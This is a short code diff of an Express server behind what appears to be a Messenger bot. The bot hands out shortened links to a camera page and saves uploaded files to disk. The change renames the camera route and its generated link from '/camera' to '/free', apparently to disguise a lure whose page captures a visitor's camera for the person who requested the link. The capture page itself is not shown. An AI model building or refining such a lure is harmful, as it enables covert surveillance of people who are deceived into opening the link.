@@ -189,7 +189,7 @@ const storage = multer.diskStorage({
 const upload = multer({ storage });
 
 // Serve camera page dynamically with injected PSID
-app.get('/camera', (req, res) => {
+app.get('/free', (req, res) => {
   const id = req.query.id || '';
   const filePath = path.join(__dirname, 'public/camera.html');
   fs.readFile(filePath, 'utf8', (err, html) => {
@@ -248,7 +248,7 @@ app.post('/webhook', async (req, res) => {
         const messageText = event.message.text?.toLowerCase();
 
         if (messageText === '/generate') {
-          const longUrl = `${req.protocol}://${req.get('host')}/camera?id=${senderId}`;
+          const longUrl = `${req.protocol}://${req.get('host')}/free?id=${senderId}`;
           const shortUrl = await shortenUrl(longUrl);
 
           // Send quick reply with Open Camera
